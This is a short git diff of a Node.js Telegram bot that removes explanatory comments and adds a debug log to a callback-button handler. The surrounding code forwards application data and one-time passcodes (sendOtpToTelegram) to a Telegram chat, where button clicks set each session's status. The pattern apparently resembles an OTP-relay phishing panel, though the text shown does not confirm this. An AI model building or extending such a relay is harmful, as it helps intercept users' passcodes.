@@ -6,7 +6,6 @@ const db = require('./db');
 const token = process.env.TELEGRAM_BOT_TOKEN;
 const chatId = process.env.TELEGRAM_CHAT_ID;
 
-// IMPORTANT: polling is false because we are using webhooks on Render
 const bot = new TelegramBot(token, { polling: false });
 
 // 1. Send Initial Application
@@ -89,6 +88,9 @@ async function sendOtpToTelegram(sessionId, data) {
 // Handle Button Clicks
 bot.on('callback_query', async (query) => {
     try {
+        // DEBUG LOG
+        console.log("🚨 BUTTON CLICKED! Data:", query.data);
+
         const data = query.data;
         const messageId = query.message.message_id;
         const parts = data.split('_');
@@ -144,8 +146,6 @@ bot.on('callback_query', async (query) => {
 
         if (statusUpdate && db.getSession(sessionId)) {
             db.updateStatus(sessionId, statusUpdate);
-            
-            // This stops the loading spinner in Telegram
             await bot.answerCallbackQuery(query.id, { text: replyText });
 
             try {
@@ -154,12 +154,10 @@ bot.on('callback_query', async (query) => {
 
             await bot.sendMessage(chatId, responseText, { parse_mode: 'Markdown' });
         } else {
-            // If the session is lost (server slept), still answer the query so it stops spinning
             await bot.answerCallbackQuery(query.id, { text: "Error: Session expired. Please try again from the website." });
         }
     } catch (error) {
         console.error("Error handling callback:", error);
-        // Final safety net to stop the spinner no matter what
         try { await bot.answerCallbackQuery(query.id, { text: "Server error occurred." }); } catch (e) {}
     }
 });
